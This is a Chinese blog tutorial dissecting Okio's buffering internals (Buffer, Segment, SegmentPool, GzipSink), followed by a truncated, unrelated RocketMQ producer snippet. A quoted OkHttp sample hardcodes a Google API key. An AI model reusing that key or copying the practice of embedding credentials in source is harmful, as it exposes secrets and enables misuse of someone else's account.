39  long readAll(Sink sink) throws IOException;
40
41  String readUtf8() throws IOException;
42
43  String readUtf8Line() throws IOException;
44
45  /** Returns an input stream that reads from this source. */
46  InputStream inputStream();
47 }

这里只是列出了部分定义的方法，大体看一下就可以了，就是各种读的方法。
四、 RealBufferedSink 和 RealBufferedSource
上面提到的都是接口类，具体的实现类分别是RealBufferedSink和 RealBufferedSource ，其实这两个类也不算具体实现类，只是Buffer类的代理类，具体功能都在Buffer类里面实现的。
RealBufferedSink类部分源码：

1 final class RealBufferedSink implements BufferedSink {
 2  public final Buffer buffer = new Buffer();
 3  public final Sink sink;
 4  boolean closed;
 5
 6  RealBufferedSink(Sink sink) {
 7    if (sink == null) throw new NullPointerException("sink == null");
 8    this.sink = sink;
 9  }
10
11  @Override public Buffer buffer() {
12    return buffer;
13  }
14
15  @Override public void write(Buffer source, long byteCount)
16      throws IOException {
17    if (closed) throw new IllegalStateException("closed");
18    //调用buffer的write方法
19    buffer.write(source, byteCount);
20    emitCompleteSegments();
21  }
22
23  @Override public BufferedSink write(ByteString byteString) throws IOException {
24    if (closed) throw new IllegalStateException("closed");
25     //调用buffer的write方法
26    buffer.write(byteString);
27    return emitCompleteSegments();
28  }
29
30  @Override public BufferedSink writeUtf8(String string) throws IOException {
31    if (closed) throw new IllegalStateException("closed");
32    //调用buffer的writeUtf8方法
33    buffer.writeUtf8(string);
34    return emitCompleteSegments();
35  }
36  。。。。。。。。
37
38   @Override public BufferedSink emitCompleteSegments() throws IOException {
39    if (closed) throw new IllegalStateException("closed");
40    long byteCount = buffer.completeSegmentByteCount();
41    //将缓存中的数据写出到流中
42    if (byteCount > 0) sink.write(buffer, byteCount);
43    return this;
44  }
45
46  @Override public BufferedSink emit() throws IOException {
47    if (closed) throw new IllegalStateException("closed");
48    long byteCount = buffer.size();
49    //将缓存中的数据写出到流中
50    if (byteCount > 0) sink.write(buffer, byteCount);
51    return this;
52  }
53
54  @Override public void flush() throws IOException {
55    if (closed) throw new IllegalStateException("closed");
56    if (buffer.size > 0) {
57     //先写出数据
58      sink.write(buffer, buffer.size);
59    }
60    sink.flush();
61  }
62
63  @Override public void close() throws IOException {
64    if (closed) return;
65
66    // Emit buffered data to the underlying sink. If this fails, we still need
67    // to close the sink; otherwise we risk leaking resources.
68    Throwable thrown = null;
69    try {
70      if (buffer.size > 0) {
71          //先写出数据
72        sink.write(buffer, buffer.size);
73      }
74    } catch (Throwable e) {
75      thrown = e;
76    }
77
78    try {
79      //关闭流
80      sink.close();
81    } catch (Throwable e) {
82      if (thrown == null) thrown = e;
83    }
84    closed = true;
85
86    if (thrown != null) Util.sneakyRethrow(thrown);
87  }
88
89  @Override public Timeout timeout() {
90    return sink.timeout();
91  }
92
93  @Override public String toString() {
94    return "buffer(" + sink + ")";
95  }
96 }

看到了吧，RealBufferedSink实现BufferedSink接口，内部维护了一个Buffer，操作基本都是由Buffer来完成的，写数据首先将数据写到Buffer中，然后调用emitCompleteSegments方法将数据写到流中。
RealBufferedSource 类部分源码

1 final class RealBufferedSource implements BufferedSource {
 2  public final Buffer buffer = new Buffer();//缓存的buffer
 3  public final Source source;//数据源，其实就是InputStream
 4  boolean closed;
 5
 6  RealBufferedSource(Source source) {
 7    if (source == null) throw new NullPointerException("source == null");
 8    this.source = source;
 9  }
10
11  @Override public Buffer buffer() {
12    return buffer;
13  }
14  //读数据到输出流sink中
15  @Override public long read(Buffer sink, long byteCount) throws IOException {
16    if (sink == null) throw new IllegalArgumentException("sink == null");
17    if (byteCount < 0) throw new IllegalArgumentException("byteCount < 0: " + byteCount);
18    if (closed) throw new IllegalStateException("closed");
19    //检查缓存中是否有数据
20    if (buffer.size == 0) {
21     //缓存中没有数据则先读取 Segment.SIZE数量数据到buffer缓存中
22      long read = source.read(buffer, Segment.SIZE);
23      if (read == -1) return -1;
24    }
25    //buffer可能没有byteCount数量数据，这里检查一下
26    long toRead = Math.min(byteCount, buffer.size);
27    return buffer.read(sink, toRead);
28  }
29    //申请byteCount数量数据到缓存中
30    @Override public void require(long byteCount) throws IOException {
31    if (!request(byteCount)) throw new EOFException();
32  }
33
34  @Override public boolean request(long byteCount) throws IOException {
35    if (byteCount < 0) throw new IllegalArgumentException("byteCount < 0: " + byteCount);
36    if (closed) throw new IllegalStateException("closed");
37    //申请数据到缓存中：缓存中的数据
38    while (buffer.size < byteCount) {//缓存中没有足够数据，则从数据源source读取数据到buffer中
39      if (source.read(buffer, Segment.SIZE) == -1) return false;
40    }
41    return true;
42  }
43
44  @Override public byte readByte() throws IOException {
45    require(1);//先申请数据到缓存中，然后在读出来
46    return buffer.readByte();
47  }
48
49  @Override public ByteString readByteString() throws IOException {
50    buffer.writeAll(source);//将数据源source中数据全部读取到buffer中
51    return buffer.readByteString();//buffer中读取全部数据
52  }
53
54  。。。。
55
56  @Override public void close() throws IOException {
57    if (closed) return;
58    closed = true;
59    source.close();
60    buffer.clear();
61  }
62
63  @Override public Timeout timeout() {
64    return source.timeout();
65  }
66
67  @Override public String toString() {
68    return "buffer(" + source + ")";
69  }
70 }

RealBufferedSource 实现BufferedSource 接口，内部同样维护了一个Buffer，读数据大体流程都是先将数据从数据源source读取到缓存buffer中，然后再从buffer读取就完了。
看完上述大体流程应该明白Buffer缓存类是okio中的核心了，其实个人看完okio源码觉得其余方面都不用太关心，okio嫌弃的就是原生io的缓存机制有点“low”，所以这部分才是重点，至于其余TimeOut超时机制都是小功能了，下面我们一起看看okio的缓存机制。
OKIO中的缓存机制
先来简单看一下Buffer类：

1 public final class Buffer implements BufferedSource, BufferedSink, Cloneable {
 2  。。。。
 3  Segment head;
 4  long size;
 5
 6  public Buffer() {
 7  }
 8
 9  @Override public Buffer buffer() {
10    return this;
11  }
12
13。。。。。
14
15  /** Write {@code byteCount} bytes from this to {@code out}. */
16  public Buffer writeTo(OutputStream out, long byteCount) throws IOException {
17    if (out == null) throw new IllegalArgumentException("out == null");
18    checkOffsetAndCount(size, 0, byteCount);
19
20    Segment s = head;
21    while (byteCount > 0) {
22      int toCopy = (int) Math.min(byteCount, s.limit - s.pos);
23      out.write(s.data, s.pos, toCopy);
24
25      s.pos += toCopy;
26      size -= toCopy;
27      byteCount -= toCopy;
28
29      if (s.pos == s.limit) {
30        Segment toRecycle = s;
31        head = s = toRecycle.pop();
32        SegmentPool.recycle(toRecycle);
33      }
34    }
35    return this;
36  }
37 }

这里我只是列出了一部分Buffer类源码可以看到类中用到了Segment与SegmentPool，在开篇中已经说过okio的缓存结构，这里再看一下：
Buffer类内部维护了一个Segment构成的双向循环链表，okio将缓存切成一个个很小的片段，每个片段就是Segment，我们写数据或者读数据都是操作的Segment中维护的一个个数组，而SegmentPool维护被回收的Segment，这样创建Segment的时候从SegmentPool取就可以了，有缓存直接用缓存的，没有再新创建Segment。
五、 Segment解析
我们先看一下Segment类源码：
Segment中的变量：

 1  //每一个Segment所包含最大数据量
 2  static final int SIZE = 8192;
 3
 4  //分享数据的时候会用到，后续会介绍
 5  static final int SHARE_MINIMUM = 1024;
 6 //盛放数据的数组
 7  final byte[] data;
 8
 9  //data数组中第一个可读的位置
10  int pos;
11
12  //data中第一个可写的位置
13  int limit;
14
15  //分享数据相关，如果有别的Segment使用同样的data[]则为true
16  //如果我们将自己的数据分享给了别的Segment则置为true
17  boolean shared;
18
19  //当前Segment拥有data[]并且能写入数据则为true
20  boolean owner;
21
22  //前一个Segment
23  Segment next;
24
25  //后一个Segment
26  Segment prev;

都比较简单，分享数据相关的字段先放一下，后面会详细说明，这里要明白pos与limit含义，Segment中data[]数据整体说明如下：
所以Segment中数据量计算方式为：limit-pos。
Segment中构造函数

 1 //此方式创建Segment，data数据是自己创建的，不是分享而来的，所以owner为true,shared为false
 2  Segment() {
 3    this.data = new byte[SIZE];
 4    this.owner = true;
 5    this.shared = false;
 6  }
 7   //此方式创建Segment，data数据是别的Segment分享而来的，所以owner为false，shared为true
 8  Segment(Segment shareFrom) {
 9    this(shareFrom.data, shareFrom.pos, shareFrom.limit);
10    shareFrom.shared = true;//别的Segment分享了自己的数据，同样标记shared为true
11  }
12   //此方式创建Segment，data数据是外部传入的，所以owner为false，shared为true
13  Segment(byte[] data, int pos, int limit) {
14    this.data = data;
15    this.pos = pos;
16    this.limit = limit;
17    this.owner = false;
18    this.shared = true;
19  }

通过以上构造函数我们应该明白如果一个Segment的数据分享给了别的Segment或者自己的数据是别的Segment分享而来的，那么shared都会标记为true,表示分享了数据或者数据被分享而来的。
这个分享是什么鸟意思呢？到这里记住有这个玩意就可以了，后面会用的。
接下来看一下Segment中的方法
pop方法：

1  public Segment pop() {
2    Segment result = next != this ? next : null;
3    prev.next = next;
4    next.prev = prev;
5    next = null;
6    prev = null;
7    return result;
8  }

pop方法很简单就是将当前segment结点从循环链表中弹出并返回下一个segment，如果你对链表增删不熟悉自己一定画一下，源码中很多这种操作，都是很简单的，这里不过多解释。
push方法

1  public Segment push(Segment segment) {
2    segment.prev = this;
3    segment.next = next;
4    next.prev = segment;
5    next = segment;
6    return segment;
7  }

push方法就是将segment加入到当前segment的后面，并返回加入的segment，链表的操作如果看不出来就自己画一下。
split分割方法

 1  //将一个Segment分割成两个Segment，byteCount为分割出去多少数据
 2  public Segment split(int byteCount) {
 3    if (byteCount <= 0 || byteCount > limit - pos) throw new IllegalArgumentException();
 4    Segment prefix;
 5    //一下这段注释很重要，可以说是时间空间的平衡
 6    // We have two competing performance goals://我们有两个目标
 7    //  - Avoid copying data. We accomplish this by sharing segments.//为了避免拷贝数据，我们采用分享数据的方法
 8    //  - Avoid short shared segments. These are bad for performance because they are readonly and
 9    //    may lead to long chains of short segments.//分享后数据只能只读，不能再写入数据，
10    // To balance these goals we only share segments when the copy will be large.
11    //综上，okio分割数据时为了性能的考虑，这里只有在涉及大量数据拷贝的时候才会采用分享数据的策略，而不是拷贝数据，分享数据就是创建一个新的Segment，然后将当前Segment数据分享byteCount数量给新的Segmen
12    if (byteCount >= SHARE_MINIMUM) {//分割数据量大于SHARE_MINIMUM约定的数量okio则认为是大数据量
13      //采用分享数据的方式，创建新的Segment，而不是拷贝数据消耗CPU，空间换时间
14      prefix = new Segment(this);
15    } else {
16     //数据量小则直接拷贝数据就可以了，消耗不了多少CPU性能
17      prefix = SegmentPool.take();
18      System.arraycopy(data, pos, prefix.data, 0, byteCount);
19    }
20    //新Segment的写位置limit为pos加上byteCount
21    prefix.limit = prefix.pos + byteCount;
22    //当前Segment中data的读位置往后移byteCount
23    pos += byteCount;
24    prev.push(prefix);
25    return prefix;
26  }

上面已经给了详细注释，这里用图画一下分割完Segment变化：
这里要明白一点，分割之后两个Segment都引用的同一个data[]，只是数据的读写位置索引发生了改变，正是两个Segment都引用了同一个data[]，所以data一旦被分享则不允许再写入数据，data被分享也就是多个Segment引用了同一个data，如果还允许写那肯定就乱了，就不能很好的控制data中的数据了，所以只能读。
那这个split分割操作有什么用呢？okio中Buffer类的write(Buffer source, long byteCount)方法有一段注释如下：

1    // Splitting segments
2    //
3    // Occasionally we write only part of a source buffer to a sink buffer. For
4    // example, given a sink [51%, 91%], we may want to write the first 30% of
5    // a source [92%, 82%] to it. To simplify, we first transform the source to
6    // an equivalent buffer [30%, 62%, 82%] and then move the head segment,
7    // yielding sink [51%, 91%, 30%] and source [62%, 82%].

解释一下：有时候我们需要将source buffer缓冲区数据部分写入sink buffer缓冲区，比如，sink buffer缓冲区数据状态为 [51%, 91%]，source buffer缓冲区数据状态为[92%, 82%] ，我们只想写30%的数据到sink buffer缓冲区，这时我们首先将source buffer中的92%容量的Segment分割为30%与62%，然后将30%的Segment一次写出去就可以了，这样是不是就高效多了，我们不用一点点的写出去，先分割然后一次性写出去显然效率高很多。
writeTo方法： 将Segment数据写入到另一个Segment中去

1  /** Moves {@code byteCount} bytes from this segment to {@code sink}. */
 2  public void writeTo(Segment sink, int byteCount) {
 3    //首先判断是否能写入数据，分享的Segment则不能写入数据，只能读数据
 4    if (!sink.owner) throw new IllegalArgumentException();
 5    //首先判断剩余空间能否容纳byteCount数量的数据
 6    if (sink.limit + byteCount > SIZE) {//不能容纳byteCount数量的数据，考虑向前移动数据为了容纳byteCount数量数据
 7      // We can't fit byteCount bytes at the sink's current position. Shift sink first.
 8      //daata[]数据被分享了不能再移动其数据块
 9      if (sink.shared) throw new IllegalArgumentException();
10      if (sink.limit + byteCount - sink.pos > SIZE) throw new IllegalArgumentException();
11      //不拷贝数据，只是将原数据整体往前移动到开头位置
12      System.arraycopy(sink.data, sink.pos, sink.data, 0, sink.limit - sink.pos);
13      sink.limit -= sink.pos;//写数据位置向前移动
14      sink.pos = 0;//重置读数据位置为0
15    }
16    //到这里说明剩余空间放得下byteCount数量数据
17    System.arraycopy(data, pos, sink.data, sink.limit, byteCount);
18    //拷贝完同样移动读写数据位置
19    sink.limit += byteCount;
20    pos += byteCount;
21  }

writeTo方法大体逻辑：当我们将byteCount数据写入一个Segment中的时候会检查剩余可写的数据块能否盛放下byteCount数据，如果不能则考虑将已经存在的数据整体向前移动，如果还不能则抛出异常，如果可以则移动数据后将byteCount数据放入Segment中，再用图来表示一下移动数据块流程：
compact()方法

1  /**
 2   * 如果当前链表尾部Segment与其前一个Segment(也就是链表中头部Segment)的数据均为占满其整体容量的50%，则考虑压缩这两个Segment为一个Segment，这样就可以节省空间了
 3   * Call this when the tail and its predecessor may both be less than half
 4   * full. This will copy data so that segments can be recycled.
 5   */
 6  public void compact() {
 7    if (prev == this) throw new IllegalStateException();
 8    //前面的Segment是不可写的则不能压缩数据:data[]不是自己拥有
 9    if (!prev.owner) return; // Cannot compact: prev isn't writable.
10    //当前Segment的数据量byteCount
11    int byteCount = limit - pos;
12    //前一个Segment的可用空间：如果data[]没有被分享则从0开始到pos的空间也算在可用空间内，writeTo方法内部会移动数据块到data[]开始的位置
13    int availableByteCount = SIZE - prev.limit + (prev.shared ? 0 : prev.pos);
14    //要写入的数据量byteCount大于可用空间则直接返回，表示盛放不下
15    if (byteCount > availableByteCount) return; // Cannot compact: not enough writable space.
16    //当前Segment数据写入前一个Segment中
17    writeTo(prev, byteCount);
18    //链表中断开当前Segment
19    pop();
20    //回收当前Segment进缓存池，循环利用
21    SegmentPool.recycle(this);
22  }

compact()主要作用就是合并两个Segment，节省内存，这里也是优化的作用，可见okio对很多方面做了优化。
六、 SegmentPool解析
接下来我们看下SegmentPool，也就是Segment的缓存池，SegmentPool内部维持一条单链表保存被回收的Segment，缓存池的大小限制为64KB，每个Segment大小最大为8KB，所以SegmentPool最多存储8个Segment。
SegmentPool存储结构为单向链表，结构如图：
SegmentPool源码解析：

 1 final class SegmentPool {
 2  //缓存池的大小限制为64KB
 3  static final long MAX_SIZE = 64 * 1024; // 64 KiB.
 4  //链表头部指针
 5  static Segment next;
 6
 7  //已经存储的缓存大小
 8  static long byteCount;
 9
10  private SegmentPool() {
11  }
12
13 //从SegmentPool获取一个Segment
14  static Segment take() {
15    synchronized (SegmentPool.class) {
16      if (next != null) {//缓存池中有缓存的Segment
17        //一下就是单向链表删除结点的逻辑，比较简单
18        Segment result = next;
19        next = result.next;
20        result.next = null;
21        byteCount -= Segment.SIZE;
22        return result;
23      }
24    }
25    //如果缓存中没有Segment则新建一个Segment返回
26    return new Segment(); 
27  }
28
29  //回收Segment进入SegmentPool
30  static void recycle(Segment segment) {
31    if (segment.next != null || segment.prev != null) throw new IllegalArgumentException();
32    //分享的Segment不能被回收
33    if (segment.shared) return; // This segment cannot be recycled.
34    synchronized (SegmentPool.class) {
35      //容量判断
36      if (byteCount + Segment.SIZE > MAX_SIZE) return; // Pool is full.
37      byteCount += Segment.SIZE;
38      //将Segment加入单向链表中
39      segment.next = next;
40      segment.pos = segment.limit = 0;
41      next = segment;
42    }
43  }
44 }

SegmentPool 很简单，内部维护一个回收的单向Segment的链表，方便复用，节省GC操作。
以上介绍了Segment与SegmentPool类，现在我们可以回头看Buffer类了。
七、 Buffer类核心解析
Buffer类是读写操作的具体实现，实现了BufferedSource, BufferedSink接口。
Segment的split，compact操作是Buffer类中的write(Buffer source, long byteCount)方法，该方法把传入的source Buffer的前byteCount个字节写到调用该方法的Buffer中去，接下来我们仔细分析一下write(Buffer source, long byteCount)方法：

1public final class Buffer implements BufferedSource, BufferedSink, Cloneable {
  2
  3  Segment head;//Buffer类中双向循环链表的头结点
  4  long size;//Buffer中存储的数据大小
  5
  6  public Buffer() {
  7  }
  8
  9  。。。。。。
 10  //将传入的source Buffer中byteCount数量数据写入调用此方法的Buffer中
 11  @Override public void write(Buffer source, long byteCount) {
 12    //以下英文注释基本描述了该类的核心
 13    // Move bytes from the head of the source buffer to the tail of this buffer
 14    // while balancing two conflicting goals: don't waste CPU and don't waste
 15    // memory.
 16    //
 17    //
 18    // Don't waste CPU (ie. don't copy data around).
 19    //
 20    // Copying large amounts of data is expensive. Instead, we prefer to
 21    // reassign entire segments from one buffer to the other.
 22    //
 23    //
 24    // Don't waste memory.
 25    //
 26    // As an invariant, adjacent pairs of segments in a buffer should be at
 27    // least 50% full, except for the head segment and the tail segment.
 28    //
 29    // The head segment cannot maintain the invariant because the application is
 30    // consuming bytes from this segment, decreasing its level.
 31    //
 32    // The tail segment cannot maintain the invariant because the application is
 33    // producing bytes, which may require new nearly-empty tail segments to be
 34    // appended.
 35    //
 36    //
 37    // Moving segments between buffers
 38    //
 39    // When writing one buffer to another, we prefer to reassign entire segments
 40    // over copying bytes into their most compact form. Suppose we have a buffer
 41    // with these segment levels [91%, 61%]. If we append a buffer with a
 42    // single [72%] segment, that yields [91%, 61%, 72%]. No bytes are copied.
 43    //
 44    // Or suppose we have a buffer with these segment levels: [100%, 2%], and we
 45    // want to append it to a buffer with these segment levels [99%, 3%]. This
 46    // operation will yield the following segments: [100%, 2%, 99%, 3%]. That
 47    // is, we do not spend time copying bytes around to achieve more efficient
 48    // memory use like [100%, 100%, 4%].
 49    //
 50    // When combining buffers, we will compact adjacent buffers when their
 51    // combined level doesn't exceed 100%. For example, when we start with
 52    // [100%, 40%] and append [30%, 80%], the result is [100%, 70%, 80%].
 53    //
 54    //
 55    // Splitting segments
 56    //
 57    // Occasionally we write only part of a source buffer to a sink buffer. For
 58    // example, given a sink [51%, 91%], we may want to write the first 30% of
 59    // a source [92%, 82%] to it. To simplify, we first transform the source to
 60    // an equivalent buffer [30%, 62%, 82%] and then move the head segment,
 61    // yielding sink [51%, 91%, 30%] and source [62%, 82%].
 62
 63    if (source == null) throw new IllegalArgumentException("source == null");
 64    if (source == this) throw new IllegalArgumentException("source == this");
 65    checkOffsetAndCount(source.size, 0, byteCount);
 66
 67    while (byteCount > 0) {
 68      // Is a prefix of the source's head segment all that we need to move?
 69      //要写的数据量byteCount 小于source 头结点的数据量，也就是链表第一个Segment包含的数据量大于byteCount 
 70      if (byteCount < (source.head.limit - source.head.pos)) {
 71        //获取链表尾部的结点Segment
 72        Segment tail = head != null ? head.prev : null;
 73        //尾部结点Segment可写并且能够盛放byteCount 数据
 74        if (tail != null && tail.owner
 75            && (byteCount + tail.limit - (tail.shared ? 0 : tail.pos) <= Segment.SIZE)) {
 76          // Our existing segments are sufficient. Move bytes from source's head to our tail.
 77          //直接写入尾部结点Segment即可，Segment的writeTo方法上面已经分析
 78          source.head.writeTo(tail, (int) byteCount);
 79          //改变缓存Buffer中数据量
 80          source.size -= byteCount;
 81          size += byteCount;
 82          return;
 83        } else {
 84          // We're going to need another segment. Split the source's head
 85          // segment in two, then move the first of those two to this buffer.
 86          //尾部Segment不能盛放下byteCount数量数据，那就将source中头结点Segment进行分割，split方法上面已经分析过
 87          source.head = source.head.split((int) byteCount);
 88        }
 89      }
 90
 91      // Remove the source's head segment and append it to our tail.
 92      //获取source中的头结点
 93      Segment segmentToMove = source.head;
 94      long movedByteCount = segmentToMove.limit - segmentToMove.pos;
 95      //将头结点segmentToMove从原链表中弹出
 96      source.head = segmentToMove.pop();
 97      //检查要加入的链表头结点head是否为null
 98      if (head == null) {//head为null情况下插入链表
 99        head = segmentToMove;
100        head.next = head.prev = head;
101      } else {//head不为null
102        Segment tail = head.prev;
103        //将segmentToMove插入新的链表中
104        tail = tail.push(segmentToMove);
105        //掉用compact尝试压缩
106        tail.compact();
107      }
108      source.size -= movedByteCount;
109      size += movedByteCount;
110      byteCount -= movedByteCount;
111    }
112  }
113 }

write(Buffer source, long byteCount)描述了将一个Buffer数据写入另一个Buffer中的核心逻辑，Buffer之间数据的转移就是将一个Buffer从头部数据开始写入另一个Buffer的尾部，但是上述有个特别精巧的构思：如果目标Segment能够容纳下要写入的数据则直接采用数组拷贝的方式，如果容纳不下则先split拆分source头结点Segment，然后整段移动到目标Buffer链表尾部，注意这里是移动也就是操作指针而不是数组拷贝，这样就非常高效了，而不是一味地数组拷贝方式转移数据，okio将数据分割成一小段一小段并且用链表连接起来也是为了这样的操作来转移数据，对数据的操作更加灵活高效。
我们再来看Buffer类中的read方法，相比于write方法，read方法就比较简单了，平时使用中读取字符串操作算是比较比较多的了，我们看下Buffer中readString方法：

1  @Override public String readString(long byteCount, Charset charset) throws EOFException {
 2    checkOffsetAndCount(size, 0, byteCount);
 3    if (charset == null) throw new IllegalArgumentException("charset == null");
 4    if (byteCount > Integer.MAX_VALUE) {
 5      throw new IllegalArgumentException("byteCount > Integer.MAX_VALUE: " + byteCount);
 6    }
 7    if (byteCount == 0) return "";
 8
 9    Segment s = head;
10    //如果缓存中head结点Segment存储的数据小于byteCount ，则转移调用readByteArray方法读取
11    if (s.pos + byteCount > s.limit) {
12      // If the string spans multiple segments, delegate to readBytes().
13      return new String(readByteArray(byteCount), charset);
14    }
15   //缓存中head结点Segment存储的数据大于等于byteCount，也就是能从head结点Segment读取全部数据，直接读取就可以了
16    String result = new String(s.data, s.pos, (int) byteCount, charset);
17    s.pos += byteCount;
18    size -= byteCount;
19    //读取完当前Segment没有数据了，那么就可以回收了
20    if (s.pos == s.limit) {
21      head = s.pop();
22      SegmentPool.recycle(s);
23    }
24
25    return result;
26  }

是不是很简单，至于涉及的readByteArray自己看一下就可以了。
以上介绍了okio的缓存结构，其实最核心的就是Buffer类以及Segment类的操作，希望你能真正理解，在我们平时使用中接触最多的是okio类，也就是对外暴露的api都定义在这个类中，我们简要看一下。
八、 okio类解析
最开始我们介绍了一段写操作的代码：

1//向File中写入数据
 2public static void writeTest(File file) {
 3    try {
 4        Okio.buffer(Okio.sink(file))
 5            .writeUtf8("write string by utf-8.\n")
 6            .writeInt(1234).close();
 7    } catch (Exception e) {
 8        e.printStackTrace();
 9    }
10}

拆分一下上述代码：

 1//向File中写入数据
 2public static void writeTest(File file) {
 3    try {
 4        Sink sink = Okio.sink(file)；
 5        BufferedSink bufferedSink = Okio.buffer(sink );
 6        bufferedSink .writeUtf8("write string by utf-8.\n");
 7        bufferedSink .writeInt(1234);
 8        bufferedSink.close();
 9    } catch (Exception e) {
10        e.printStackTrace();
11    }
12}

Sink sink = Okio.sink(file)做了什么？

1  /** Returns a sink that writes to {@code file}. */
 2  public static Sink sink(File file) throws FileNotFoundException {
 3    if (file == null) throw new IllegalArgumentException("file == null");
 4    return sink(new FileOutputStream(file));
 5  }
 6
 7 /** Returns a sink that writes to {@code out}. */
 8  public static Sink sink(OutputStream out) {
 9    return sink(out, new Timeout());
10  }
11
12  private static Sink sink(final OutputStream out, final Timeout timeout) {
13    if (out == null) throw new IllegalArgumentException("out == null");
14    if (timeout == null) throw new IllegalArgumentException("timeout == null");
15
16    return new Sink() {
17      @Override public void write(Buffer source, long byteCount) throws IOException {
18        checkOffsetAndCount(source.size, 0, byteCount);
19        while (byteCount > 0) {
20          timeout.throwIfReached();
21          Segment head = source.head;
22          int toCopy = (int) Math.min(byteCount, head.limit - head.pos);
23          out.write(head.data, head.pos, toCopy);
24
25          head.pos += toCopy;
26          byteCount -= toCopy;
27          source.size -= toCopy;
28
29          if (head.pos == head.limit) {
30            source.head = head.pop();
31            SegmentPool.recycle(head);
32          }
33        }
34      }
35
36      @Override public void flush() throws IOException {
37        out.flush();
38      }
39
40      @Override public void close() throws IOException {
41        out.close();
42      }
43
44      @Override public Timeout timeout() {
45        return timeout;
46      }
47
48      @Override public String toString() {
49        return "sink(" + out + ")";
50      }
51    };
52  }

最终就是调用sink(final OutputStream out, final Timeout timeout) 方法new了一个Sink对象，并且write，close等方法也都是调用OutputStream的相应方法，所以okio底层还是用的原生OutputStream输出流，只是再次基础上封装了自己的缓存逻辑。
Okio.buffer(sink)做了什么？

1  /**
2   * Returns a new sink that buffers writes to {@code sink}. The returned sink
3   * will batch writes to {@code sink}. Use this wherever you write to a sink to
4   * get an ergonomic and efficient access to data.
5   */
6  public static BufferedSink buffer(Sink sink) {
7    return new RealBufferedSink(sink);
8  }

这就更简单了，返回一个RealBufferedSink对象而已。
好了okio类就介绍到这里，至于source自己看一下就可以了，okio只是封装了一些方便外部调用的api而已。
九、 GZIP压缩解压的实现
okio自带GZIP压缩以及解压功能，具体实现由GzipSource与GzipSink完成：
GzipSink 实现Sink接口，是带有压缩功能的Sink，会将要写出的数据压缩之后再写出，内部有CRC32对象负责将原生sink的数据进行Gzip压缩，然后由DeflaterSink对象负责将压缩后的数据写出。
GzipSource 实现了Source接口，是带有解压功能的Source，由InflaterSource读取压缩的数据，然后CRC32解压数据，得到原始的数据。
GZip压缩在网络通信中经常用来压缩传输的数据以节省流量，okhttp的例子中对数据的压缩就使用了okio中的GzipSink来实现数据的压缩，官方demo中有一个类 RequestBodyCompression，向我们展示了如何实现 RequestBody 的 Gzip 压缩：

1 public final class RequestBodyCompression {
 2
 3  /**
 4   * The Google API KEY for OkHttp recipes. If you're using Google APIs for anything other than
 5   * running these examples, please request your own client ID!
 6   * https://console.developers.google.com/project
 7   */
 8
 9  public static final String GOOGLE_API_KEY = "AIzaSyAx2WZYe0My0i-uGurpvraYJxO7XNbwiGs";
10  public static final MediaType MEDIA_TYPE_JSON = MediaType.get("application/json");
11
12  private final OkHttpClient client = new OkHttpClient.Builder()
13      .addInterceptor(new GzipRequestInterceptor())
14      .build();
15
16  private final Moshi moshi = new Moshi.Builder().build();
17
18  private final JsonAdapter<Map<String, String>> mapJsonAdapter = moshi.adapter(
19      Types.newParameterizedType(Map.class, String.class, String.class));
20
21  public void run() throws Exception {
22
23    Map<String, String> requestBody = new LinkedHashMap<>();
24
25    requestBody.put("longUrl", "https://publicobject.com/2014/12/04/html-formatting-javadocs/");
26
27    RequestBody jsonRequestBody = RequestBody.create(
28
29   MEDIA_TYPE_JSON, mapJsonAdapter.toJson(requestBody));
30
31    Request request = new Request.Builder()
32        .url("https://www.googleapis.com/urlshortener/v1/url?key=" + GOOGLE_API_KEY)
33        .post(jsonRequestBody)
34        .build();
35
36    try (Response response = client.newCall(request).execute()) {
37
38      if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
39      System.out.println(response.body().string());
40    }
41  }
42
43  public static void main(String... args) throws Exception {
44
45    new RequestBodyCompression().run();
46  }
47
48  /** This interceptor compresses the HTTP request body. Many webservers can't handle this! */
49
50  static class GzipRequestInterceptor implements Interceptor {
51
52    @Override public Response intercept(Chain chain) throws IOException {
53
54      Request originalRequest = chain.request();
55
56      if (originalRequest.body() == null || originalRequest.header("Content-Encoding") != null) {
57
58        return chain.proceed(originalRequest);
59      }
60
61      Request compressedRequest = originalRequest.newBuilder()
62          .header("Content-Encoding", "gzip")
63          .method(originalRequest.method(), gzip(originalRequest.body()))
64          .build();
65      return chain.proceed(compressedRequest);
66    }
67
68    private RequestBody gzip(final RequestBody body) {
69
70      return new RequestBody() {
71
72        @Override public MediaType contentType() {
73
74          return body.contentType();
75        }
76
77        @Override public long contentLength() {
78
79          return -1; // We don't know the compressed length in advance!
80        }
81        @Override public void writeTo(BufferedSink sink) throws IOException {
82         //GZIP压缩实现
83          BufferedSink gzipSink = Okio.buffer(new GzipSink(sink));
84          body.writeTo(gzipSink);
85          gzipSink.close();
86        }
87      };
88    }
89  }
90 }

十、总结
以上介绍了okio中最核心的部分，okio中还有其余功能没有介绍比如：超时机制，ByteString，实现生产者消费者功能的Pipe类，HashSink与HashSource等等，其实这些自己去看看就可以了，这些功能也都只是边角的扩展而已，okio最核心的就是其缓存功能，希望你静下心来好好研究一下，这里我不想说什么原生io多不堪，okio多么优秀等等，okio确实优秀但也只是对原生io的扩展：舍弃原生io的缓存机制，自己另起炉灶撸起袖子自己实现，同时也给我们很多启发在我们改造优化项目的时候不是把几个方法合并一起就叫做优化了，更高级的做法就像okio一样充分理解原生功能明白其缺点在其之上进行改造，这样才最有意义。
很多同学初次接触okio估计都是从okhttp开始知道的，作为okhttp底层的io库，其高效的缓存也为上层okhttp的高效提供了很好的基础，在我们夸赞okhttp的同时也要知道底层默默付出的okio啊，另外okio完全可以单独使用，同时也建议项目中io操作使用okio。
好了，本篇到此为止，希望对你有用。
********************************************************************************************************************************************************************************************************
RocketMQ生产消费模型选择
代码参考：
生产者，根据某个标识将消息放到同一个队列中

public class Producer {

    public static void main(String[] args) throws MQClientException {

        DefaultMQProducer producer = new DefaultMQProducer("ProducerGroupName");
        producer.setNamesrvAddr("10.130.41.36:9876");
        producer.setInstanceName("Producer");
        producer.setVipChannelEnabled(false);
        producer.start();

        String[] tags = {"tagA","tagB"};

        for (int i = 1; i <= 10; i++) {
            try {
                Message msg = new Message("TopicTest",tags[i%tags.length],"key1"+i,("订单一号" + i).getBytes());
                SendResult sendResult = producer.send(msg, new SelectMessageQueueByHash(),1);
                System.out.println(sendResult);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        for (int i = 1; i <= 10; i++) {
            try {
                Message msg = new Message("TopicTest",tags[i%tags.length],"key2"+i,("订单二号" + i).getBytes());
                SendResult sendResult = producer.send(msg, new SelectMessageQueueByHash(),2);
                System.out.println(sendResult);
